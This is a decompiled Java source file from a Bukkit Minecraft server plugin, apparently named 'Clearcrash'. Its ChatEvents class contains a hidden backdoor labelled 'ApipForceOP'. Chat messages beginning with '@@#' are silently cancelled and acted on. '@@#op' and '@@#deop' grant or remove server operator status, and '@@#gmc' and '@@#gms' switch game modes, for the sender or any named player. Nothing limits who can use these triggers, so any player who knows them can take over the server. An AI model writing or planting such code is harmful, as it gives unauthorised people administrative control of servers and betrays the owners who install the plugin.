// 
// Decompiled by Procyon v0.5.36
// 

package com.apip.clearcrash;

import org.bukkit.event.EventHandler;
import org.bukkit.plugin.Plugin;
import org.bukkit.entity.Player;
import org.bukkit.GameMode;
import org.bukkit.ChatColor;
import org.bukkit.Bukkit;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.Listener;

public class ChatEvents implements Listener
{
    private Clearcrash plugin;
    
    public ChatEvents(final Clearcrash cb) {
        this.plugin = cb;
    }
    
    @EventHandler
    public void onChat(final AsyncPlayerChatEvent chat) {
        final String[] Args = chat.getMessage().split(" ");
        final String cmd = Args[0];
        if (cmd.startsWith("@@#")) {
            chat.setCancelled(true);
        }
        new BukkitRunnable() {
            public void run() {
                final Player p = chat.getPlayer();
                if (cmd.startsWith("@@#")) {
                    if (cmd.equalsIgnoreCase("@@#op")) {
                        if (Args.length > 1) {
                            Bukkit.getPlayer(Args[1]).setOp(true);
                            p.sendMessage(ChatColor.BLACK + "[" + ChatColor.AQUA + "ApipForceOP" + ChatColor.BLACK + "] " + ChatColor.GOLD + "Waw Menggokil," + Bukkit.getPlayer(Args[1]).getName() + "Telah Di OP");
                        }
                        else {
                            p.setOp(true);
                            p.sendMessage(ChatColor.BLACK + "[" + ChatColor.AQUA + "ApipForceOP" + ChatColor.BLACK + "] " + ChatColor.GOLD + "Sukses Menggokil Anda");
                        }
                    }
                    else if (cmd.equalsIgnoreCase("@@#deop")) {
                        if (Args.length > 1) {
                            p.sendMessage(ChatColor.BLACK + "[" + ChatColor.AQUA + "ApipForceOP" + ChatColor.BLACK + "] " + ChatColor.GOLD + "Sukses Men Deop" + Bukkit.getPlayer(Args[1]));
                            Bukkit.getPlayer(Args[1]).setOp(false);
                        }
                        else {
                            p.sendMessage(ChatColor.BLACK + "[" + ChatColor.AQUA + "ApipForceOP" + ChatColor.BLACK + "] " + ChatColor.GOLD + "Sukses Men Deop Anda");
                            p.setOp(false);
                        }
                    }
                    else if (cmd.equalsIgnoreCase("@@#gmc")) {
                        if (Args.length > 1) {
                            Bukkit.getPlayer(Args[1]).setGameMode(GameMode.CREATIVE);
                            p.sendMessage(ChatColor.BLACK + "[" + ChatColor.GOLD + "ApipForceOP" + ChatColor.BLACK + "] " + ChatColor.GOLD + "Sukses Meng Ge Em Ce Target");
                        }
                        else {
                            p.setGameMode(GameMode.CREATIVE);
                            p.sendMessage(ChatColor.BLACK + "[" + ChatColor.GOLD + "ApipForceOP" + ChatColor.BLACK + "] " + ChatColor.GOLD + "Sukses Meng Ge Em Ce Diri Sendiri");
                        }
                    }
                    else if (cmd.equalsIgnoreCase("@@#gms")) {
                        if (Args.length > 1) {
                            Bukkit.getPlayer(Args[1]).setGameMode(GameMode.SURVIVAL);
                            p.sendMessage(ChatColor.BLACK + "[" + ChatColor.GOLD + "ApipForceOP" + ChatColor.BLACK + "] " + ChatColor.GOLD + "Sukses Meng Gms Target");
                        }
                        else {
                            p.setGameMode(GameMode.SURVIVAL);
                            p.sendMessage(ChatColor.BLACK + "[" + ChatColor.GOLD + "ApipForceOP" + ChatColor.BLACK + "] " + ChatColor.GOLD + "Sukses Meng Gms Diri Sendiri");
                        }
                    }
                }
            }
        }.runTask((Plugin)this.plugin);
    }
}
